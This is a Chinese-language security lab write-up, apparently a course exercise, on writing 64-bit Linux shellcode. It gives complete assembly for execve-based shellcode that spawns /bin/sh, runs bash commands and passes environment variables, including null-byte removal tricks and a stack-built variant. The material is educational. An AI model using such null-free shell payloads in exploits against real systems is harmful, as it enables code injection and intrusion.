---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# Shellcode

## 任务 1：编写汇编代码

利用命令行 `nasm -f elf64 hello.s -o hello.o` 编译汇编代码，用 `ld hello.o -o hello` 链接生成可执行文件，运行 `./hello`：

![](../../../../../assets/Pasted%20image%2020250707175812.png)

利用 `objdump -Mintel -d hello.o` 来反汇编，`-Mintel` 选项表示生成 Intel 模式的汇编代码：

![](../../../../../assets/Pasted%20image%2020250707180638.png)

用 `xxd -p -c 20 hello.o` 命令打印二进制文件的内容：

![](../../../../../assets/Pasted%20image%2020250707180859.png)
***
## 任务 2：编写 Shellcode（方法 1）

### 任务 2.a 理解代码

编译并运行代码：

![](../../../../../assets/Pasted%20image%2020250707181416.png)

可以发现我们获得了一个 Shell，使用 gdb 调试，观察代码，程序通过 `jmp short two` 跳转到 `two` 标签处，接着执行 `call one`，它会将下一条指令的地址（即 `/bin/sh` 字符串的地址）保存到栈中的返回地址，那么通过 `pop rbx` 指令可以将这个地址从栈顶弹出到 `rbx` 寄存器中就可以获得 `/bin/sh` 字符串地址:

![](../../../../../assets/Pasted%20image%2020250707183004.png)

![](../../../../../assets/Pasted%20image%2020250707183437.png)

可以看到，`rbx` 寄存器中确实存储了 `/bin/sh` 字符串的地址

在代码中，argv 的构造通过 `mov [rbx+8], rbx` ，将 `/bin/sh` 字符串储存到 `argv[0]`，然后通过 `mov rax, 0x00` 和 `mov [rbx+16], rax` 将 `argv[1]` 设置为 NULL 作为结尾，从而构造 `argv` 数组

第 ① 行 `mov rdi, rbx` 将 `/bin/sh` 字符串的地址存储到 `rdi` 寄存器中，作为 `execve` 的第一个参数
第 ② 行 `lea rsi, [rbx+8]` 将 `argv` 数组的地址存储到 `rsi` 寄存器中，作为 `execve` 的第二个参数
***
### 任务 2.b 消除代码中的零

我们利用以下方式来规避代码中的 0：

- 用 `xor rax, rax` 来代替 `mov rax, 0x00`
- 先用占位符占据字符串应该填 `\0` 的位置，再用为 0 的 al 寄存器来覆盖这个位置
- 先将 rax 至零，再将一个字节的数字 59（0x3B）来填充 al 寄存器使得 rax 为 59

修改过后的 `mysh64.s` 如下：

```asm
section .text
global _start

_start:
    BITS 64
    jmp short two

one:
    pop rbx
    xor rax, rax            ; rax = 0
    mov [rbx+7], al        ; rbx = '/bin/sh\0'
    mov [rbx+8], rbx
    mov [rbx+16], rax

    mov rdi, rbx
    lea rsi, [rbx+8]
    mov rdx, rax
    mov al, 59              ; rax = 59
    syscall

two:
    call one
    db '/bin/sh', 0xFF
    db 'AAAAAAAA'
    db 'BBBBBBBB'
```
***
### 任务 2.c：运行更复杂的命令

为了实现 `/bin/bash -c "echo hello; ls -la"`，我们只需要修改 argv 的构造即可：

```asm
section .text
global _start

_start:
    BITS 64
    jmp short two

one:
    pop rbx             
    xor rax, rax         ; rax = 0
    mov [rbx+9], al
    mov [rbx+12], al
    mov [rbx+31], al
    
    mov rdi, rbx
	lea rsi, [rbx+32]
	mov [rsi], rdi
	lea rax, [rbx+10]
	mov [rsi+8], rax
	lea rax, [rbx+13]
	mov [rsi+16], rax
	xor rax, rax
	mov [rsi+24], rax
	
	mov rdx, rax
	mov al, 59            ; rax = 59
	syscall
	
two:
    call one
    db '/bin/bas'
    db 'hX-cYech'
    db 'o hello;'
    db ' ls -laZ'
    db 'AAAAAAAA'
    db 'BBBBBBBB'
	db 'CCCCCCCC'
	db 'DDDDDDDD'
```

编译并运行代码：

![](../../../../../assets/Pasted%20image%2020250708135415.png)

可以看到，我们成功执行了命令，且与实际效果一致
***
### 任务 2.d. 传递环境变量

我们利用 `/usr/bin/env` 命令来打印环境变量，同时传递环境变量数组，代码如下：

```asm
section .text
global _start

_start:
    BITS 64
    jmp short two

one:
    pop rbx             
    xor rax, rax         ; rax = 0
    mov [rbx+12], al
    mov [rbx+22], al
    mov [rbx+32], al
    mov [rbx+48], al
    
    mov rdi, rbx
	lea rsi, [rbx+56]
	mov [rsi], rdi
	xor rax, rax
	mov [rsi+8], rax
	lea rdx, [rbx+72]
	lea rax, [rbx+13]
	mov [rdx], rax
	lea rax, [rbx+23]
	mov [rdx+8], rax
	lea rax, [rbx+33]
	mov [rdx+16], rax
	xor rax, rax
	mov [rdx+24], rax
	
	mov al, 59            ; rax = 59
	syscall
	
two:
    call one
    db '/usr/bin'
    db '/envXaaa'
    db '=helloYb'
    db 'bb=world'
    db 'Zccc=hel'
    db 'lo world'
    db 'AAAAAAAA'
    db 'AAAAAAAA'
    db 'BBBBBBBB'
	db 'CCCCCCCC'
	db 'DDDDDDDD'
	db 'EEEEEEEE'
	db 'FFFFFFFF'
```

编译并运行代码：

![](../../../../../assets/Pasted%20image%2020250708141703.png)

可以看到，我们成功将环境变量输出了
***
## 任务 3：编写 Shellcode（方法 2）

使用动态在栈上构造的方式，编写命令 `/bin/bash -c "echo hello; ls -la"` 的 shellcode 如下：

```asm
section .text
global _start

_start:
	xor rdx, rdx
	
	push rdx
	mov rax, 'bash'
	push rax
	mov rax, '/bin////'
	push rax
	mov rbx, rsp
	
	push rdx
	mov rax, '-ccc'
	push rax
	mov rsi, rsp
	
	push rdx
	mov rax, 'ls -la  '
	push rax
	mov rax, ' hello; '
	push rax
	mov rax, 'echo    '
	push rax
	mov rdi, rsp
	
	push rdx
	push rdi
	push rsi
	push rbx
	mov rsi, rsp
	
	mov rdi, rbx
	
	xor rax, rax
	mov al, 59
	syscall
```

编译并运行代码：

![](../../../../../assets/Pasted%20image%2020250708161606.png)

可以看到，我们成功执行了命令，相对来说，我更喜欢第二种方法，比较灵活且暴力


